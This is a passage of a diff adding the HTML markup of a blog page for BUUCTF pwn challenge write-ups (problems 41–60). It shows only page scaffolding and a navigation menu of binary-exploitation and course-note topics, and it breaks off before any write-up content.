@@ -1,0 +1,3603 @@
+
+<!doctype html>
+<html lang="zh" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+        <link rel="canonical" href="https://maple-pwn.github.io/pwn/wp/buuctf/buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8841-60%E9%A2%98%EF%BC%89/">
+      
+      
+        <link rel="prev" href="../buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8821-40%E9%A2%98%EF%BC%89/">
+      
+      
+        <link rel="next" href="../buuctf%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95%EF%BC%8861-80%E9%A2%98%EF%BC%89/">
+      
+      
+      <link rel="icon" href="../../../../images/logo.svg">
+      <meta name="generator" content="mkdocs-1.6.1, mkdocs-material-9.6.20">
+    
+    
+      
+        <title>41-60题 - Maple's blog</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../assets/stylesheets/main.e53b48f4.min.css">
+      
+        
+        <link rel="stylesheet" href="../../../../assets/stylesheets/palette.06af60db.min.css">
+      
+      
+
+
+    
+    
+      
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+      <link rel="stylesheet" href="../../../../resources/css/extra.css">
+    
+      <link rel="stylesheet" href="../../../../resources/css/tittle.css">
+    
+      <link rel="stylesheet" href="../../../../resources/css/read-metrics.css">
+    
+      <link rel="stylesheet" href="../../../../resources/css/leftsidebar.css">
+    
+      <link rel="stylesheet" href="https://static.zeoseven.com/zsft/292/main/result.css">
+    
+    <script>__md_scope=new URL("../../../..",location),__md_hash=e=>[...e].reduce(((e,_)=>(e<<5)-e+_.charCodeAt(0)),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
+  
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#buu41-60" class="md-skip">
+          跳转至
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="页眉">
+    <a href="../../../.." title="Maple&#39;s blog" class="md-header__button md-logo" aria-label="Maple's blog" data-md-component="logo">
+      
+  <img src="../../../../images/logo.svg" alt="logo">
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3zm0 5h18v2H3zm0 5h18v2H3z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Maple's blog
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              41-60题
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      
+        <form class="md-header__option" data-md-component="palette">
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换到深色模式"  type="radio" name="__palette" id="__palette_0">
+    
+      <label class="md-header__button md-icon" title="切换到深色模式" for="__palette_1" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+    
+    
+    
+    <input class="md-option" data-md-color-media="" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="切换到浅色模式"  type="radio" name="__palette" id="__palette_1">
+    
+      <label class="md-header__button md-icon" title="切换到浅色模式" for="__palette_0" hidden>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12s-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12z"/></svg>
+      </label>
+    
+  
+</form>
+      
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&palette.color){if("(prefers-color-scheme)"===palette.color.media){var media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']");palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent")}for(var[key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
+    
+    
+    
+      
+      
+        <label class="md-header__button md-icon" for="__search">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        </label>
+        <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="搜索" placeholder="搜索" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.52 6.52 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5"/></svg>
+        
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="查找">
+        
+        <button type="reset" class="md-search__icon md-icon" title="清空当前内容" aria-label="清空当前内容" tabindex="-1">
+          
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" tabindex="0" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            正在初始化搜索引擎
+          </div>
+          <ol class="md-search-result__list" role="presentation"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+      
+    
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+            
+<nav class="md-tabs" aria-label="标签" data-md-component="tabs">
+  <div class="md-grid">
+    <ul class="md-tabs__list">
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../mysys/01/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  我的手搓OS笔记
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../LLMZtH/RL/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  LLM-Zero-to-Hero
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../study/dw/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  校内学习相关笔记
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+    
+  
+  
+    
+    
+      <li class="md-tabs__item md-tabs__item--active">
+        <a href="../../../tricks/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  二进制安全
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../sth/proj/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  一些零碎
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+  
+  
+    
+    
+      <li class="md-tabs__item">
+        <a href="../../../../testpage/test/" class="md-tabs__link">
+          
+  
+  
+    
+  
+  功能测试页
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ul>
+  </div>
+</nav>
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+  
+
+
+<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="导航栏" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../../../.." title="Maple&#39;s blog" class="md-nav__button md-logo" aria-label="Maple's blog" data-md-component="logo">
+      
+  <img src="../../../../images/logo.svg" alt="logo">
+
+    </a>
+    Maple's blog
+  </label>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
+        
+          
+          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    我的手搓OS笔记
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_1">
+            <span class="md-nav__icon md-icon"></span>
+            我的手搓OS笔记
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../mysys/01/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    实模式
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../mysys/02/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    保护模式
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../mysys/03/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    内核
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../mysys/04/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    内存管理
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../mysys/05/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    IO机制
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../mysys/06/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    扩展文件系统
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_2" id="__nav_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    LLM-Zero-to-Hero
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_2">
+            <span class="md-nav__icon md-icon"></span>
+            LLM-Zero-to-Hero
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../LLMZtH/RL/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    RL学习笔记
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_3" id="__nav_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    校内学习相关笔记
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3">
+            <span class="md-nav__icon md-icon"></span>
+            校内学习相关笔记
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../study/dw/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    大学物理(十二、十三章)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../study/dw2/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    大学物理(十四、十五章)
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../study/gt/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    概率与统计
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../study/lisan/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    离散数学
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../study/cs_final/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    计组部分笔记
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../study/cs_exam/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    计组部分试卷&重点题目分析
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../study/mao/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    毛中特
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../study/eda/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    数字逻辑
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../../study/asm/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    汇编速通
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+      
+      
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+        
+        
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--section md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_4" id="__nav_4_label" tabindex="">
+            
+  
+  
+  <span class="md-ellipsis">
+    二进制安全
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_4_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_4">
+            <span class="md-nav__icon md-icon"></span>
+            二进制安全
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../tricks/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    小技巧
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_2" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_2" id="__nav_4_2_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    栈利用
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_2_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_2">
+            <span class="md-nav__icon md-icon"></span>
+            栈利用
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Stack/%E6%B1%87%E7%BC%96%E9%80%9F%E9%80%9A/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    汇编速通
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Stack/ASLR/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    ASLR绕过
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Stack/Canary/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Canary绕过
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Stack/PIE%E7%BB%95%E8%BF%87/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    PIE绕过
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Stack/fmt-all-in-one/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    格式化字符串
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Stack/shellcode-all-in-one/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Shellcode
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Stack/SROP/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    SROP
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_3" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_3" id="__nav_4_3_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    堆利用
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_3_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_3">
+            <span class="md-nav__icon md-icon"></span>
+            堆利用
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Heap/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    基础知识
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Heap/%E5%90%84%E4%B8%AA%E5%87%BD%E6%95%B0%E5%8E%9F%E5%9E%8B/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    函数原型
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Heap/%E5%A0%86%E6%BA%A2%E5%87%BA/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    堆溢出
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Heap/%E5%A0%86%E6%BA%A2%E5%87%BA%E4%B8%AD%E6%AF%94%E8%BE%83%E9%87%8D%E8%A6%81%E7%9A%84%E6%AD%A5%E9%AA%A4/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    堆溢出要点
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Heap/%E5%A0%86%E4%B8%AD%E7%9A%84off-by-one/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Off-by-one
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Heap/%E5%A0%86%E5%90%84%E7%B1%BB%E6%94%BB%E5%87%BB%E6%89%8B%E6%B3%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    攻击手法
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../Heap/%E4%BE%8B%E9%A2%98%E8%AE%B0%E5%BD%95/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    例题记录
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_4" id="__nav_4_4_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    IO_FILE
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_4">
+            <span class="md-nav__icon md-icon"></span>
+            IO_FILE
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IO_FILE/_IO_FILE%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    基础知识
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IO_FILE/IO_FILE%E6%BA%90%E7%A0%81/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    源码分析
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IO_FILE/fopen/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fopen
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IO_FILE/fread/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    fread
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../IO_FILE/%E5%81%9A%E9%A2%98%E6%8A%80%E5%B7%A7/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    做题技巧
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_4_5" >
+        
+          
+          <label class="md-nav__link" for="__nav_4_5" id="__nav_4_5_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    House系列
+    
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_4_5_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_4_5">
+            <span class="md-nav__icon md-icon"></span>
+            House系列
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../house/%E5%85%B3%E4%BA%8Ehouse%20of%20apple1%E7%9A%84%E7%A0%94%E7%A9%B6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    House of Apple1
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../house/%E5%85%B3%E4%BA%8Ehouse-of-apple2%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    House of Apple2
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../house/%E5%85%B3%E4%BA%8Ehouse%20of%20cat%20%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    House of Cat
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../house/%E5%85%B3%E4%BA%8Ehouse-of-kiwi%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    House of Kiwi
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../../house/%E5%85%B3%E4%BA%8Ehouse-of-botcake%E7%9A%84%E7%A0%94%E7%A9%B6/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    House of Botcake
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
